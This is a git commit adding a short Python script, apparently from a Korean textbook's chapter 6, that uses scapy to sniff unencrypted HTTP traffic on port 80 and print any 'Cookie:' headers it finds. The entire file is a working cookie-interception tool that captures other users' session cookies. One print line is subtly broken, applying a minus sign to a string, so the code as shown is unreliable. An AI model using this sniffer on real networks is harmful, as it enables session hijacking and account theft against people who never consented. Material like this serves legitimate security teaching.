46a93cf8126523199d4ec7ce325fc70b49b3bade
Arongbang <43198196+Arongbang@users.noreply.github.com>
2026-01-07 15:15:03 +0900

    6.23 소스코드 업로드

---
+++ 6장/6.23_cookieSniffer.py
@@ -0,0 +1,22 @@
+#쿠키 정보 가로채기
+
+from scapy.all import *
+#re : 파이썬에서 정규식 지원 모듈
+import re
+
+def cookieSniffer(packet):
+	tcp = packet.getlayer('TCP')
+	#'Cookie: 문자열‘과 동일한 패턴을 찾기 위해
+	cookie = re.search(r'Cookie: (.+)', str(tcp.payload))
+	
+	if cookie:
+		print(---'COOKIE SNIFFED\n[%s]' %cookie.group())
+	
+	
+def main():
+	print('+++START SNIFFING COOKIE')
+	sniff(filter='tcp port 80', store=0, prn=cookieSniffer)
+	
+
+if __name__ == '__main__':
+	main()
